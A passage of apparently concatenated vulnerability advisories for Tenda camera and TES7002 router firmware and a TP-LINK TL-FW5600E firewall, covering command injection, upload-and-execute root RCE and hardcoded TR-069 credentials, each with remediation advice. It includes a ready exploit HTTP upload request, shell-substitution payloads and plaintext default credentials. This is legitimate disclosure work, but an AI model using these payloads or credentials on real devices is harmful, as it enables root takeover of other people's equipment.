![Disassembly of sink group A: Wi-Fi interface name to libc system()](TC3T14C_kylin_images/fig4.png)

Annotated disassembly shows `ldr r3,[0x6e5b38]` (interface name), `snprintf` with `ifconfig %s down`/`iwconfig %s mode monitor`/`ifconfig %s up`, each followed by `blx #0x1dc24 ; PLT -> system()`.

![Sink groups B-E: ip rule/SystemAsh, non-blocking IP check, gateway route, MAC](TC3T14C_kylin_images/fig5.png)

Shows `IPAddress` lookups feeding `ip rule ...` into `bl #0x35e918` (SystemAsh), the non-blocking `inet_aton` check at `0x8b27e`-`0x8b2d0`, `route add default gw %s ppp0` via sprintf→SystemAsh, and `ifconfig %s hw ether %s` via sprintf→SystemAsh.

![Sink groups F-H: bond0, MTU, and SystemAsh internals](TC3T14C_kylin_images/fig6.png)

Shows `ifconfig bond0 %s netmask %s up` (sprintf→SystemAsh), `ifconfig %s mtu %d` (SystemAsh), and SystemAsh itself: `vsnprintf` → `lstat64("/bin/bash")` → `vfork` → `execl` with `/bin/bash` and `/bin/ash` fallback.

![Unicorn chain B benign vs injected runs with ALL CHECKS PASSED](TC3T14C_kylin_images/fig7.png)

Function-level emulation of block `0x8bbf2`: the benign run produces `execl("/bin/bash","bash","-c","ip rule del from 192.168.1.1 table 20")`; the injected run produces `execl("/bin/bash","bash","-c","ip rule del from 192.168.1.1;id>/tmp/KYLIN_CWE78_UNICORN;# table 20")`, ending with `ALL CHECKS PASSED`.

## Impact

- Arbitrary shell command execution as **root** on the camera (Kylin runs with root privileges; both dropped PoC files contain `uid=0(root)`).
- Full device compromise: surveillance feed access, credential theft, firmware replacement, and pivoting into the network the camera is attached to.
- The injection surface spans many configuration fields (`IPAddress`, `DefaultGateway`, interface names) and both execution primitives, so a fix limited to `system()` alone would not close the hole.

## Remediation Suggestions

1. **Whitelist input validation**: validate network interface names against a strict whitelist of known-good values (eth0, eth1, wlan0, ppp0, bond0, ...); validate IP/netmask/gateway with `inet_pton` and actually abort the configuration flow on failure — the current check at `0x361270` only logs and sets a flag while execution continues; validate MAC addresses with `^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$`.
2. **Cover both execution primitives**: remediation must address libc `system()` (PLT `0x1dc24`, 20 sites) and the internal `SystemAsh` (`0x35e918`, 176 sites); replacing only `system()` leaves the same injection surface.
3. **Replace shell commands with safe APIs**: use ioctl calls (`SIOCSIFADDR`, `SIOCSIFFLAGS`, `SIOCSIFMTU`, `SIOCSIFHWADDR`) for interface configuration and rtnetlink sockets for addresses and policy routing (`ip rule`-style operations), eliminating shell invocation entirely.
4. **Parameterized command execution**: if external commands are unavoidable, `execve` the target program directly with arguments as separate argv elements, never through `sh -c`, so metacharacters lose their separator semantics.
5. **Least privilege**: isolate network configuration in a dedicated privileged helper process called through a restricted IPC interface with an action whitelist, limiting the blast radius of any injection.

## References

- Firmware download (vendor site, as recorded in the package metadata): `https://static.tenda.com.cn/doc/2025/01/13/50fb4f8651054455a37321f0d7131d82/TC3T14CV1.0%E5%8D%87%E7%BA%A7%E5%8C%85.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda TES7002 V4.0.0: boa formImportOMCIShell Uploaded Script Execution (Unauthenticated Reachability Likely, Root RCE)
content:
# Tenda TES7002 V4.0.0: boa formImportOMCIShell Uploaded Script Execution (Unauthenticated Reachability Likely, Root RCE)

## Vulnerability Type / CWE

- **CWE-78: OS Command Injection** / **CWE-434: Unrestricted Upload of File with Dangerous Type**
- The `formImportOMCIShell` handler in the boa web server writes an uploaded `multipart/form-data` payload to `/tmp/omcishell` and immediately executes it via `system("/bin/sh /tmp/omcishell")`. The sink chain (upload → write to disk → `system()` execution) was confirmed both by static disassembly and by Unicorn instruction-level execution of the real ARM64 code; the handler performs no content filtering whatsoever.

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
|--------|---------|-------|-----------------------------|----------|-----------|
| Tenda | TES7002 (PA98A 1.0 platform) | TES7002 | `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin` — V4.0.0 (v1.0.0.86_en+cn_TD) | Critical | `bin/boa` — `formImportOMCIShell` handler |

- Architecture: ARM aarch64 (little endian), ELF not stripped
- Firmware SHA-256: `061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4`
- Upload entry: `POST /boaform/formImportOMCIShell` (form on maintenance page `/bd/vermod.asp`, field `binary`)

## Vulnerability Description

In the Tenda TES7002 V1.0 router firmware (V4.0.0), the boa web server exposes a `formImportOMCIShell` handler that processes `multipart/form-data` file uploads. The handler extracts the MIME part body from boa's temporary upload file, writes it to `/tmp/omcishell` via `fopen64("/tmp/omcishell", "w")` + `fwrite()`, and then directly calls `system("/bin/sh /tmp/omcishell")`. Because boa runs as root (`User 0` / `Group 0` in `home/httpd/boa.conf`), the uploaded content executes as a root-privileged shell script.

The dangerous sink was confirmed at runtime: a Unicorn/Capstone harness loaded the real code and read-only data from `bin/boa`, executed the actual ARM64 instructions from `fopen64` through `bl system`, and intercepted the libc stubs — the `system()` argument register `x0` pointed to `/bin/sh /tmp/omcishell`. The handler never calls `IsCommandInjection` and applies no filtering to the uploaded content.

Regarding remote reachability (the source side): the upload form lives on the maintenance/diagnostic page `/bd/vermod.asp` with a bare `/boaform/` form action (no `/admin/` prefix). The `auth_authorize` function contains a `strncmp(url, "/bd/", 4)` comparison, suggesting `/bd/`-related paths may fall inside the authentication whitelist. However, `auth_authorize` is a 2332-byte function that also interweaves `strstr` checks for `.asp`/`.html` and a runtime-populated whitelist table (global `0x4dd780`), and the audit environment could not boot boa with full networking (hardware flash/MIB dependencies). The "no credentials required" conclusion is therefore rated high-probability but pending real-device confirmation.

## Root Cause Analysis

Addressing convention: code locations use virtual addresses (vaddr); `.rodata` strings use file offsets (paddr), the two differing by `0x400000`.

### 1. Entry point

The maintenance page `home/httpd/web/bd/vermod.asp` (line 244) defines the upload form:

```html
<form action=/boaform/formImportOMCIShell enctype="multipart/form-data" method=POST name="saveConfig">
```

with a file input `name="binary"` at line 247.

### 2. Handler: `formImportOMCIShell` (bin/boa, vaddr 0x464c40, 1176 bytes)

The handler (symbol table: `GLOBAL FUNC 1176 formImportOMCIShell`) scans for `\r\n\r\n` (skipping MIME part headers) and `----` (boundary end) with `fgetc` loops, then uses `ftell`/`fseek`/`malloc`/`fread` to extract the body into a heap buffer. It then:

- calls `fopen64("/tmp/omcishell", "w")` at `0x464f4c` (path string at paddr `0xc4120`),
- calls `fwrite()` at `0x464f84` to write the body to that file, and `puts("create file omcishell")`.

### 3. Command execution sink (`0x464fac`-`0x464fb4`)

```asm
; write to disk -> execute (vaddr)
0x464f44: adrp  x0, 0x4c4000
0x464f48: add   x0, x0, 0x120     ; x0 -> "/tmp/omcishell"
0x464f4c: bl    sym.imp.fopen64   ; fopen64("/tmp/omcishell", "w")
...
0x464f84: bl    sym.imp.fwrite    ; fwrite(uploaded_buf, 1, size, stream)
...
0x464fac: adrp  x0, 0x4c4000
0x464fb0: add   x0, x0, 0x148     ; x0 -> "/bin/sh /tmp/omcishell"
0x464fb4: bl    sym.imp.system    ; system("/bin/sh /tmp/omcishell")
```

The uploaded file is executed by `/bin/sh` with root privileges, with no content validation. The disassembly contains no `IsCommandInjection` call.

### 4. Privilege level

`home/httpd/boa.conf` lines 27-28 set `User 0` / `Group 0` — boa runs as root, and `/etc/inittab` bootstraps the service chain (`:::sysinit:/etc/init.d/rcS`) as root. The uploaded script inherits root privileges.

### 5. Authentication context: `auth_authorize` (vaddr 0x41adcc, 2332 bytes)

| Item | Value |
|------|-------|
| Function | `auth_authorize` |
| Virtual address | 0x41adcc (2332 bytes) |
| `/bd/` strncmp sequence | 0x41afb0-0x41afc0 (`mov x2,4` ... `bl strncmp`), `b.ne` at 0x41afc8 |
| `"/bd/"` string | file offset 0x6c668 (vaddr 0x46c668) |

The function interweaves `strcmp(url, "/")`, `strstr(url, ".asp"/".html"/".HTML")` checks and a loop over a runtime whitelist table (global pointer `0x4dd780`), with multiple branches converging on the "continue processing" point `0x41b0a4`. Static reading alone cannot prove that a POST to `/boaform/formImportOMCIShell` skips login authentication. Note also that the binary stores the registration name as the bare `formImportOMCIShell` — the string `/boaform/admin/formPing` does not exist in the binary, so prefix-based comparisons are not a valid argument either way.

## Exploitation

### Preconditions

- Network reachability to the target device's web server (port 80).
- Reachability of the endpoint without credentials is rated likely (the `/bd/` whitelist hint) but was not runtime-verified in the audit environment; the sink itself is proven.

### Step 1: Verify and unpack the firmware

```bash
sha256sum "./TES7001&02V1.0升级软件.zip"
# 061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4
bash ./extract_firmware.sh
cat ./extract/squashfs-root/etc/version
# V4.0.0 -- Fri Dec 27 15:17:33 CST 2024
grep -E '^(User|Group)' ./extract/squashfs-root/home/httpd/boa.conf
# User 0
# Group 0        -> boa runs as root
```

### Step 2: Confirm the sink by static disassembly (radare2)

```bash
BOA=./extract/squashfs-root/bin/boa
r2 -q -e bin.relocs.apply=true -c 'is~formImportOMCIShell~FUNC' "$BOA"
# 1311 0x00064c40 0x00464c40 GLOBAL FUNC 1176 formImportOMCIShell
r2 -q -e bin.relocs.apply=true -c 'pd 24 @ 0x464f3c' "$BOA"
# ... bl sym.imp.fopen64("/tmp/omcishell","w") ... bl sym.imp.fwrite ... bl sym.imp.system
```

### Step 3: Runtime confirmation (Unicorn instruction-level PoC)

```bash
python3 ./unicorn_poc_omci.py
```

Observed output:

```text
handler symbol: sym.formImportOMCIShell @ 0x464c40 (size 1176)
[seed   ] BUF slot=0x70f00128, SIZE slot=0x70f00134
[*] Emulating real handler code from fopen64('/tmp/omcishell','w') to system():
    [fopen64] open("/tmp/omcishell", "w") -> 0xa0000000
    [fwrite ] writing 42 bytes -> bytes = b'#!/bin/sh\nid > /tmp/pwned\necho PWNED_CNVD\n'
    [puts   ] 'create file omcishell'
    [system ] >>> REAL SINK HIT: system("/bin/sh /tmp/omcishell") executed from live ARM64 code at 0x464fb4
    [system ] argument x0=0x4c4148 read back from emulated memory
[result] upload bytes written to /tmp/omcishell : b'#!/bin/sh\nid > /tmp/pwned\necho PWNED_CNVD\n'
[result] system() argument                     : '/bin/sh /tmp/omcishell'
VERDICT SUCCESS: real ARM64 execution reaches system("/bin/sh /tmp/omcishell")
                 after fwrite() of the uploaded file content to /tmp/omcishell.
```

### Step 4: Network attack request (device-side delivery)

```http
POST /boaform/formImportOMCIShell HTTP/1.1
Host: <target_ip>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="binary"; filename="exploit.sh"
Content-Type: application/octet-stream

#!/bin/sh
id > /tmp/pwned
echo PWNED_CNVD
------WebKitFormBoundary--
```

The handler parses the body out of the multipart request, writes it to `/tmp/omcishell`, and `system("/bin/sh /tmp/omcishell")` executes the attacker's script as root.

## Evidence

![Firmware package SHA-256 verification and extraction showing US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin](TES7002_omci_images/fig1.png)

Firmware hash verification (`sha256sum`) matching the expected digest `061f415a...90b09e4`, followed by `extract_firmware.sh` unpacking the package which contains `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin`.

![Firmware version banner V4.0.0 and file identification of bin/boa as aarch64 ELF, not stripped](TES7002_omci_images/fig2.png)

`cat /etc/version` shows `V4.0.0 -- Fri Dec 27 15:17:33 CST 2024`; `file bin/boa` identifies an ARM aarch64 dynamically linked ELF, not stripped.

![radare2 disassembly of formImportOMCIShell showing fopen64 and fwrite calls](TES7002_omci_images/fig3.png)

radare2 confirms the symbol `formImportOMCIShell @ 0x464c40 (GLOBAL FUNC 1176)` and disassembles the write-to-disk chain: `add x0, x0, 0x120` (→ `/tmp/omcishell`), `bl sym.imp.fopen64`, then `bl sym.imp.fwrite` at `0x464f84`.

![Unicorn runtime PoC output showing real ARM64 execution reaching system("/bin/sh /tmp/omcishell")](TES7002_omci_images/fig4.png)

The Unicorn harness executes the real handler machine code: `fwrite` of the 42-byte payload `#!/bin/sh\nid > /tmp/pwned\necho PWNED_CNVD\n`, then `REAL SINK HIT: system("/bin/sh /tmp/omcishell") executed from live ARM64 code at 0x464fb4`, with verdict `VERDICT SUCCESS`.

## Impact

- If the endpoint is reachable (rated likely unauthenticated, pending device confirmation), an attacker obtains arbitrary command execution as **root** — boa runs with `User 0`/`Group 0` and the executed script inherits those privileges.
- Full device compromise: persistent configuration modification, firmware replacement, traffic interception (DNS redirection), and pivoting into the carrier's access network from the compromised CPE.
- The handler applies no content filtering (`IsCommandInjection` is never called), so any shell script content is accepted.

## Remediation Suggestions

1. **Enforce authentication**: place `formImportOMCIShell` behind mandatory administrator authentication (e.g. under `/boaform/admin/...`) and validate the session explicitly at request dispatch rather than relying on implicit URL-prefix rules.
2. **Audit and tighten the `/bd/` whitelist**: verify every path matched by the `/bd/` prefix, `.asp`/`.html` suffix checks, and the runtime whitelist table in `auth_authorize`; maintenance and diagnostic pages and their backend endpoints must require authentication.
3. **Restrict upload content**: perform structural validation and only accept predefined OMCI configuration formats; reject shell scripts.
4. **Do not execute uploaded files**: never use `system("/bin/sh ...")` on uploaded content; process OMCI configurations with a dedicated parser instead of a generic shell interpreter.
5. **Least privilege**: boa should not run as `User 0`/`Group 0`; upload and diagnostic handling should run under a minimally privileged account with a restricted filesystem scope.

## References

- Firmware download (vendor site, as contained in the audit package): `https://static.tenda.com.cn/doc/2025/01/16/f36afdb8eafd47a1858311fe27e028a4/TES7001&02V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda TES7002 V4.0.0: TR-069 CWMP config_default.xml Hardcoded Credentials (Unauthenticated, ACS Impersonation and Remote Management Takeover)
content:
# Tenda TES7002 V4.0.0: TR-069 CWMP config_default.xml Hardcoded Credentials (Unauthenticated, ACS Impersonation and Remote Management Takeover)

## Vulnerability Type / CWE

- **CWE-798: Use of Hard-coded Credentials**
- The factory-default configuration file shipped inside the firmware contains plaintext, shared TR-069/CWMP authentication credentials that cannot be changed through the normal web management interface.

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
|--------|---------|-------|-----------------------------|----------|-----------|
| Tenda | TES7002 (PA98A 1.0 platform) | TES7002 | `US_TES7002V1.0re_v1.0.0.86_en+cn_TD.bin` — V4.0.0 (v1.0.0.86_en+cn_TD) | Medium | `/etc/config_default.xml` (TR-069/CWMP default configuration) |

- Architecture: ARM aarch64 (little endian)
- Default configuration file size: 276,399 bytes
- Firmware SHA-256: `061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4`

## Vulnerability Description

The Tenda TES7002 V1.0 router firmware (V4.0.0) ships a factory-default configuration file `/etc/config_default.xml` (276,399 bytes) that hardcodes, in plaintext, the authentication credentials of the TR-069/CWMP (CPE WAN Management Protocol) remote management stack:

- **ACS server authentication**: `CWMP_ACS_USERNAME=hgw`, `CWMP_ACS_PASSWORD=hgw` — used by the device when it registers to the Auto-Configuration Server (ACS) over HTTP.
- **Connection Request authentication**: `CWMP_CONREQ_USERNAME=itms`, `CWMP_CONREQ_PASSWORD=itms` — used to authenticate the ACS when it issues a Connection Request to the device.
- **ACS server URL**: `CWMP_ACS_URL=http://40.10.10.100:9090/ACS-server/ACS`.

TR-069 (CWMP) is the standard protocol used by carriers to remotely manage CPE devices. Through it, an ACS can modify device configuration, push firmware upgrades, and reboot the device — effectively full remote control. Because every device of the same model shares the same factory credentials, an attacker who extracts them can:

1. Stand up a malicious ACS server, authenticate with the known `hgw/hgw` credentials, and accept device registrations to push malicious configuration (e.g. change DNS, enable remote management ports, replace firmware).
2. Use the known `itms/itms` credentials to send an HTTP Digest-authenticated Connection Request to the device's TR-069 port, triggering the device to immediately connect back to an attacker-controlled ACS.

The credentials are loaded automatically on first boot and after a factory reset, and cannot be modified by ordinary users through the web management interface.

## Root Cause Analysis

The TR-069 client parameters are seeded from the out-of-box defaults file `/etc/config_default.xml`, which is loaded into the running configuration at first boot and on factory reset. Searching the extracted file for CWMP entries (`grep -n CWMP`) reveals the credentials near lines 9717-9727:

| Item | Value |
|------|-------|
| File path | `/etc/config_default.xml` |
| File size | 276,399 bytes |
| Key lines | 9717-9727 |
| Key parameters | `CWMP_ACS_USERNAME`, `CWMP_ACS_PASSWORD`, `CWMP_CONREQ_USERNAME`, `CWMP_CONREQ_PASSWORD` |

Configuration excerpt (lines 9717-9727):

```xml
<Value Name="CWMP_ACS_URL" Value="http://40.10.10.100:9090/ACS-server/ACS"/>
<Value Name="CWMP_ACS_URL_OLD" Value="http://40.10.10.100:9090/ACS-server/ACS"/>
<Value Name="CWMP_ACS_USERNAME" Value="hgw"/>
<Value Name="CWMP_ACS_PASSWORD" Value="hgw"/>
...
<Value Name="CWMP_CONREQ_USERNAME" Value="itms"/>
<Value Name="CWMP_CONREQ_PASSWORD" Value="itms"/>
```

Analysis of the two credential pairs:

1. `CWMP_ACS_USERNAME` / `CWMP_ACS_PASSWORD` (`hgw`/`hgw`) authenticate the device's HTTP requests toward the ACS. Since all devices of the same model ship with the same values, an attacker can operate a rogue ACS that accepts device registration using these well-known credentials.
2. `CWMP_CONREQ_USERNAME` / `CWMP_CONREQ_PASSWORD` (`itms`/`itms`) authenticate the ACS when it actively issues a Connection Request to the device over HTTP Digest. An attacker who knows these values can invoke the device's Connection Request endpoint directly and force the device to connect to a malicious ACS, without waiting for the periodic Inform interval.
3. The credentials are stored in plaintext in the factory defaults, are shared across the entire product line, and cannot be changed by ordinary users via the web management interface.

## Exploitation

### Preconditions

- The attacker has obtained the firmware image (publicly downloadable from the vendor) and can extract `/etc/config_default.xml`, or has knowledge of the shared credentials.
- For the Connection Request abuse: network reachability to the target device's TR-069 port, and an attacker-controlled ACS endpoint the device can connect to.

### Steps (credential extraction from firmware)

1. Verify the firmware package hash and unpack it:

   ```bash
   sha256sum "./TES7001&02V1.0升级软件.zip"
   # expected: 061f415aa4966f853495727663ab1d54ca3089b4bd4f464061de5bbaa90b09e4
   bash ./extract_firmware.sh
   ```

2. Confirm the firmware version banner:

   ```bash
   cat ./extract/squashfs-root/etc/version
   # V4.0.0 -- Fri Dec 27 15:17:33 CST 2024
   ```

3. Extract and verify the CWMP credentials from the factory defaults file:

   ```bash
   grep -n 'CWMP_ACS_USERNAME\|CWMP_ACS_PASSWORD\|CWMP_CONREQ_USERNAME\|CWMP_CONREQ_PASSWORD' \
     ./extract/squashfs-root/etc/config_default.xml
   ```

4. The grep output confirms the ACS credentials are `hgw`/`hgw` (lines 9718-9719) and the Connection Request credentials are `itms`/`itms` (lines 9726-9727), both hardcoded in plaintext.

### Steps (abuse against a live device)

Using the known Connection Request credentials `itms`/`itms`, send an HTTP Digest-authenticated request to the device's Connection Request endpoint to make the device initiate a CWMP session with an attacker-controlled ACS:

```http
GET /ConnectionRequest HTTP/1.1
Host: <target_ip>:<cwmp_port>
Authorization: Digest username="itms", realm="...", nonce="...",
  uri="/ConnectionRequest", response="<md5_digest>"
```

A successful request causes the device to connect to the attacker's ACS, where malicious configuration (DNS changes, exposed management ports, firmware replacement) can be pushed via standard TR-069 RPCs.

## Evidence

This package contains no screenshot evidence; verification output is captured in command transcripts.

**Transcript: `cwmp-hardcoded-creds.transcript`** — full command output of `grep CWMP etc/config_default.xml` against the unpacked firmware, confirming the plaintext credentials:

```text
验证对象：Tenda TES7002 V1.0 V4.0.0 | 命令：grep CWMP etc/config_default.xml
	<Value Name="CWMP_ACS_URL" Value="http://40.10.10.100:9090/ACS-server/ACS"/>
	<Value Name="CWMP_ACS_URL_OLD" Value="http://40.10.10.100:9090/ACS-server/ACS"/>
	<Value Name="CWMP_ACS_USERNAME" Value="hgw"/>
	<Value Name="CWMP_ACS_PASSWORD" Value="hgw"/>
	<Value Name="CWMP_CONREQ_USERNAME" Value="itms"/>
	<Value Name="CWMP_CONREQ_PASSWORD" Value="itms"/>
```

**Transcript: `version-info.transcript`** — firmware version banner proving the audited asset version:

```text
验证对象：Tenda TES7002 V1.0 V4.0.0 | 命令：cat etc/version
V4.0.0 -- Fri Dec 27 15:17:33 CST 2024
```

## Impact

- **Rogue ACS impersonation**: every TES7002 running this firmware shares the same ACS-side credentials, so an attacker-operated ACS can be accepted by devices and used to push arbitrary TR-069 configuration — including DNS hijacking, opening remote management access, and firmware replacement.
- **Forced device callback**: with the shared `itms`/`itms` Connection Request credentials, an attacker can force any reachable device to immediately establish a CWMP session with the attacker's ACS, bypassing the periodic Inform interval.
- **No user remediation**: the credentials are re-applied on every factory reset and cannot be modified through the web management interface, so exposure persists for the lifetime of the deployment.

## Remediation Suggestions

1. **Remove hardcoded credentials**: strip the default values of `CWMP_ACS_USERNAME`, `CWMP_ACS_PASSWORD`, `CWMP_CONREQ_USERNAME`, `CWMP_CONREQ_PASSWORD` from `/etc/config_default.xml` and provision them per-device by the carrier's ACS at first deployment.
2. **Per-device unique credentials**: generate credentials derived from the device serial number or MAC address and store them in non-volatile storage when the device first registers to the ACS.
3. **Strong password policy**: if factory-preset credentials are unavoidable, derive a unique default per device (e.g. `HMAC-SHA256(master_key, serial_number)`).
4. **Encrypted storage**: store CWMP credentials encrypted in the configuration file rather than in plaintext; decrypt only at runtime inside the TR-069 client.
5. **Credential rotation**: implement automatic periodic rotation of CWMP credentials via TR-069 `SetParameterValues` on `InternetGatewayDevice.ManagementServer.ConnectionRequestUsername` and `ConnectionRequestPassword` to shrink the exposure window after a leak.

## References

- Firmware download (vendor site, as contained in the audit package): `https://static.tenda.com.cn/doc/2025/01/16/f36afdb8eafd47a1858311fe27e028a4/TES7001&02V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-LINK TL-FW5600E 1.11.2: webfilter.lua time Parameter Command Injection (Authenticated, Root RCE)
content:
# TP-LINK TL-FW5600E 1.11.2: webfilter.lua time Parameter Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- **Vulnerability Type**: Blacklist-validator bypass ($ / backtick omitted) allowing shell command substitution in the web-filter time-object parameter

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | TP-LINK |
| Product | TL-FW5600E (Enhanced Firewall) |
| Model | TL-FW5600E V1.0 |
| Firmware filename & version | TL-FW5600E V1.0升级软件20260311_1.11.2.zip — 1.11.2 Build 260311 Rel.56321n |
| Severity | High |
| Component | `/usr/lib/lua/luci/controller/admin/webfilter.lua` (`apply_webfilter_list`), reached via the unified data service `POST /cgi-bin/luci/admin/ds/ds`; validator `/usr/lib/lua/luci/torchlight/validator.lua` (check_timeobj_name, lines 500–506) |

Firmware package SHA-256: `0f66edb812ba58e7d6565f728cf3b380be0fbf877d495eab181314bc2e12e7f2`
Inner BIN SHA-256: `d6ae7e3662cb9fe0bc60a5b6f8d6019a4d0eff417b964985baeb4befb275b4b6`
Platform: Qualcomm IPQ-series SoC, ARM 32-bit EABI5 + musl libc, Linux 3.14.2, OpenWrt/SLP base with a pure-Lua LuCI (Lua 5.1) management plane.

## Vulnerability Description

All management-plane business data is submitted as JSON to the unified data service `POST /cgi-bin/luci/admin/ds/ds`, where `ds.lua` dispatches to callbacks registered by each controller. The web-filter module (`webfilter.lua`) registers the `webfilter_list` sectype; field validators are registered through `check_webfilter_list` via `register_sectype_filter`. The `time` field (effective time-object name) is mapped to `luci.torchlight.validator.check_timeobj_name` (validator.lua:500).

That validator is a **blacklist**, not a whitelist: it only rejects characters matching `[\+#&=|<>^;%s]` (semicolon, `&`, spaces, newlines, backslash, etc.) and limits length to 50. The blacklist omits the two critical shell metacharacters — `$` and the backtick — so a value such as `Any$(id)` passes validation untouched.

When a rule is enabled and `time` is not `Any`, `apply_webfilter_list` splices the `time` value into a shell statement **without any quoting**:

```lua
". /lib/webfilter/time.sh && add_timeobj " .. e.para.time .. " " .. e.name   -- add branch, webfilter.lua:64
-- modify branch is of the same shape (webfilter.lua:100)
```

and passes it to `l.fork_exec`, which ultimately runs `n.exec("/bin/sh", "-c", cmd)`. The `$(id > /tmp/pwn_webfilter.txt)` inside the `time` value is therefore expanded by the shell as command substitution, and the injected command runs with the same privileges as the LuCI services — root. The root cause is incomplete blacklist coverage: a classic "blacklists always miss one" defect, triggerable by any account that can log into the management plane and call the web-filter write interface.

## Root Cause Analysis

The vulnerable code is in the unpacked rootfs at `/usr/lib/lua/luci/controller/admin/webfilter.lua` (single-line compressed layout; line numbers per the unpacked file) with the validator at `/usr/lib/lua/luci/torchlight/validator.lua` lines 500–506:

1. **Entry and registration chain** — `webfilter.lua:6 register_sectype_cb("webfilter","webfilter_list","check_webfilter_list","apply_webfilter_list",nil)`. HTTP JSON requests reach this sectype's validate/execute callbacks through `usr/lib/lua/luci/controller/ds.lua` (`do_ds → set_data → do_chkcb/filter_args/do_srvcb`).
2. **Parameter validation** — `webfilter.lua:23` registers `["time"]={[e]="luci.torchlight.validator.check_timeobj_name"}`. `validator.lua:500–506` implements only the blacklist `if e:match("[\+#&=|<>^;%s]") then return n.EINVARG end` plus a length check (<= 50). Live testing with Lua 5.1 confirmed `check_timeobj_name("Any$(id)")` passes — `$`, `(`, `)` are not blacklisted, so command-substitution syntax sails through.
3. **Dangerous call** — `webfilter.lua:64` (add branch, when `enable` is `on` and `time` is not `Any`): `l.fork_exec(". /lib/webfilter/time.sh && add_timeobj "..e.para.time.." "..e.name)`; `webfilter.lua:100` (modify branch) is identical in shape. The `time` value is wrapped in no quotes; `fork_exec` (`usr/lib/lua/luci/torchlight/util.lua`) ends in `n.exec("/bin/sh","-c",cmd)` — the `$(command)` construct enters the shell text verbatim and is interpreted as command substitution.

## Exploitation

### Preconditions

- A valid Web management-plane session (administrator, or an account with write permission on the web-filter module); the management plane is reachable on the LAN by default.
- The request targets `POST /cgi-bin/luci/admin/ds/ds` with `method=add`, a `webfilter_list` para, `enable=on`, and a malicious `time` field.

### Steps

All steps were run in the delivery directory with relative paths. Because the firmware is an ARM full-machine image (its `/usr/bin/lua` is ELF32 ARM EABI5, interp `/lib/ld-musl-arm.so.1`) and no matching SoC device tree exists for qemu-system, verification ran at emulation level 2: qemu-arm loading the firmware's own ARM Lua interpreter to execute the vulnerable module — the same call path as the management-plane dispatcher (`os.execute` inside the emulation is carried by the host `/bin/sh`, equivalent to the device running LuCI as root).

1. Verify and unpack: `bash ./extract_firmware.sh` checks the ZIP SHA-256 (`0f66edb8…2e7f2`), unzips the upgrade package, locates the SquashFS 4.0 (xz) rootfs at offset 0x13C0200 via binwalk, extracts `./extract/squashfs-root`, and exports the inner BIN (SHA-256 `d6ae7e36…4b6`).
2. Asset proof: `grep SMARTs ./extract/squashfs-root/etc/banner`, the firmware-header model string read at 0xC802C0 (`FW5600EV1`), and the locale entry `"TL-FW5600E":"增强级防火墙"` together confirm the audited object is TL-FW5600E V1.0 firmware 1.11.2 Build 260311.
3. Injected payload (time field):

```text
Any$(id > /tmp/pwn_webfilter.txt 2>&1;uname -a >> /tmp/pwn_webfilter.txt 2>&1)
```

4. Command capture (hooked, nothing executed): loading `webfilter.lua` with the firmware's ARM Lua interpreter and hooking `luci.sys.fork_exec` while calling `apply_webfilter_list("add", ...)` captured the final command line, showing the unquoted splice:

```text
[CAPTURED fork_exec] . /lib/webfilter/time.sh && add_timeobj Any$(id > /tmp/pwn_webfilter.txt 2>&1) webfilter_rule_01
```

5. End-to-end reproduction (self-contained `python3 ./poc.py`, or `bash ./poc_webfilter_inject.sh` / `run_emulation.sh ./harness_webfilter_real.lua`): without any hook, the real `/bin/sh` executes the spliced statement; `/tmp/pwn_webfilter.txt` lands on disk containing `uid=0(root) gid=0(root) groups=0(root),1000(docker)` and the `uname -a` kernel banner — the injected command ran as root (`VERDICT SUCCESS`).

## Evidence

![Firmware extraction: both SHA-256 hashes, SquashFS at 0x13C0200, version banner TL-FW5600E V1.0 1.11.2 Build 260311](TLFW5600E_images/fig1.png)

![Asset proof: SLP banner, firmware-header model FW5600EV1, and TL-FW5600E locale entry](TLFW5600E_images/fig2.png)

![Hooked fork_exec capture: time value spliced unquoted into 'add_timeobj Any$(id > /tmp/pwn_webfilter.txt 2>&1) webfilter_rule_01'](TLFW5600E_images/fig3.png)

![End-to-end harness run: the full $() payload command entering /bin/sh -c](TLFW5600E_images/fig4.png)

![poc.py run: /tmp/pwn_webfilter.txt containing uid=0(root) and uname -a output, VERDICT SUCCESS](TLFW5600E_images/fig5.png)

## Impact

An authenticated management-plane user with access to the web-filter write interface can execute arbitrary shell commands with root privileges on the firewall. Since the device is a perimeter security appliance, root-level compromise enables persistent interception of traffic, rule tampering, credential harvesting, and lateral movement into every network segment it protects.

## Remediation Suggestions

Per the report's recommendations:

1. Fix the validator: the `check_timeobj_name` blacklist `[\+#&=|<>^;%s]` is systematically bypassable ($ and backtick are missing). Replace it with a whitelist `^[A-Za-z0-9_]+$` (the semantics of a time-object name only ever allow alphanumerics and underscore); fix the same blacklist family everywhere — blacklist-based validation should not be used in any shell-splicing scenario.
2. Eliminate the shell interpretation surface: replace the `'. /lib/webfilter/time.sh && add_timeobj <time> <name>'` splices in the add/modify branches (webfilter.lua:64, :100) with either (a) rule parameters delivered via ubus or written to a configuration file that time.sh reads, or (b) an execve/argv-array form of `fork_exec` (e.g. posix_spawn) so the `time` value never enters shell text.
3. Defense in depth: intercept injection signatures (`;|&$()<>`, newlines) at a unified `fork_exec`/`fork_call` entry point with audit logging; the ds data service should reject fields without a registered validator by default; add CI static gates requiring every `fork_exec` call-site's variable arguments to trace back to a whitelist validator.
